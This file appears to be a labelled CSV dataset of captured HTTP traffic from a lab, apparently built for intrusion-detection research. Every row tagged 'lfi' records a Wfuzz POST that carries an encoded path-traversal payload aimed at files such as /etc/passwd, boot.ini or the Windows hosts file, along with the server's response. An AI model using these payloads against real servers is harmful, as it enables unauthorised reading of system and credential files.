attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port,res_header_Connection,req_header_Connection
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%5c%c0%ae%c0%ae%5cetc%5cpasswd,*/*,51.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39780,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%c0%2f%c0%ae%c0%ae%c0%2f%c0%ae%c0%ae%c0%2f%c0%ae%c0%ae%c0%2fetc%c0%2fissue,*/*,95.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:20 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39788,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pcetc%c1%pcissue,*/*,113.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:20 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39794,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%c1%afetc%c1%afpasswd,*/*,42.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:20 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39810,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%bg%qf%c0%ae%c0%ae%bg%qfetc%bg%qfissue,*/*,59.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:20 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39826,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%%35%%63%c0%ae%c0%ae%%35%%63%c0%ae%c0%ae%%35%%63etc%%35%%63issue,*/*,85.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39838,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%25c0%25af%c0%ae%c0%ae%25c0%25af%c0%ae%c0%ae%25c0%25af%c0%ae%c0%ae%25c0%25af%c0%ae%c0%ae%25c0%25afboot.ini,*/*,127.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39844,close,
lfi,192.168.60.165,80,filename=%c0%5e%c0%5e\etc\issue,*/*,31.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39854,close,
lfi,192.168.60.165,80,filename=%c0%5e%c0%5e0x2fetc0x2fissue,*/*,37.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39856,close,
lfi,192.168.60.165,80,filename=%c0%5e%c0%5e%c1%9cetc%c1%9cissue,*/*,41.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39872,close,
lfi,192.168.60.165,80,filename=%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts,*/*,135.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39888,close,
lfi,192.168.60.165,80,filename=%c0%5e%c0%5e%u2216etc%u2216passwd,*/*,42.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39900,close,
lfi,192.168.60.165,80,filename=%c0%5e%c0%5e%%35%%63%c0%5e%c0%5e%%35%%63%c0%5e%c0%5e%%35%%63etc%%35%%63issue,*/*,85.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39904,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\windows\system32\drivers\etc\hosts,*/*,121.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39914,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%252f%c0%ee%c0%ee%252f%c0%ee%c0%ee%252f%c0%ee%c0%ee%252fetc%252fissue,*/*,90.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39930,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee0x5c%c0%ee%c0%ee0x5c%c0%ee%c0%ee0x5c%c0%ee%c0%ee0x5c%c0%ee%c0%ee0x5c%c0%ee%c0%ee0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,*/*,151.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39936,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,*/*,117.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39938,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%c1%pc%c0%ee%c0%ee%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts,*/*,99.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39948,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%c1%1cetc%c1%1cpasswd,*/*,42.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39962,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%u2216etc%u2216issue,*/*,41.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39976,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%%32%%66%c0%ee%c0%ee%%32%%66%c0%ee%c0%ee%%32%%66etc%%32%%66passwd,*/*,86.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:23 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39986,close,
lfi,192.168.60.165,80,filename=%c0%ee%c0%ee%f0%80%80%afetc%f0%80%80%afissue,*/*,53.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:23 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,39998,close,
lfi,192.168.60.165,80,filename=%c0%fe%c0%fe0x5cetc0x5cissue,*/*,37.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:23 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40010,close,
lfi,192.168.60.165,80,filename=%c0%fe%c0%fe%c0%2f%c0%fe%c0%fe%c0%2f%c0%fe%c0%fe%c0%2f%c0%fe%c0%fe%c0%2f%c0%fe%c0%fe%c0%2f%c0%fe%c0%fe%c0%2fboot.ini,*/*,125.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:23 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40026,close,
lfi,192.168.60.165,80,filename=%c0%fe%c0%fe%c0%9v%c0%fe%c0%fe%c0%9v%c0%fe%c0%fe%c0%9vetc%c0%9vissue,*/*,77.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:23 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40040,close,
lfi,192.168.60.165,80,filename=%c0%fe%c0%fe%c1%af%c0%fe%c0%fe%c1%af%c0%fe%c0%fe%c1%af%c0%fe%c0%fe%c1%af%c0%fe%c0%fe%c1%afetc%c1%afpasswd,*/*,114.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40044,close,
lfi,192.168.60.165,80,filename=%c0%fe%c0%fe%uEFC8%c0%fe%c0%fe%uEFC8%c0%fe%c0%fe%uEFC8%c0%fe%c0%fe%uEFC8%c0%fe%c0%fe%uEFC8etc%uEFC8issue,*/*,113.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40054,close,
